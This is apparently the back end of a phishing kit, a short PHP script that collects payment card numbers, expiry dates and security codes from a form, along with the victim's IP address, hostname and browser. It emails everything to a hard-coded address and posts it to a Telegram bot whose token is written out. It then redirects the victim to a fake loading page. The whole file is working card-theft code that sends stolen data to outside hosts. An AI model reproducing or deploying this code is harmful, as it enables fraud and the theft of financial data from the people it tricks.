<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

$message .= "===========================INFORMATIONS CONFIRMATION===========================\n";
$message .= "Numero C             : ".$_POST['TarjetaInput']."\n";
$message .= "Date              : ".$_POST['datem']." - ".$_POST['datan']." \n";
$message .= "Crypt              : ".$_POST['CryptInput']."\n";
$message .= "Crypt2              : ".$_POST['CryptInput2']."\n";
$message .= "===========================INFOS OF MACHINE===========================\n";
$message .= "Ip              : $ip\n";
$message .= "Host               : $hostname\n";
$message .= "BROWSER     : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "===========================KA7iYAWDAN===========================\n";
$send = "fadelisalman@gmail.com";
$subject = "TARJJJJJJEEEETA | $ip ";
$headers = "From:IDENTIFIANTE <fadelisalman@gmail.com>";
mail($send,$subject,$message,$headers);
$website="https://api.telegram.org/bot5453394264:AAF6V7uIW1rUO7pX6EuVVHiGBP67ROFFrd8";
$chatId=-718692179;  //Receiver Chat Id 
$params=[
    'chat_id'=>'-718692179',
   'text'=>$message,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);
header("Location: charg3m3nt.php");

?>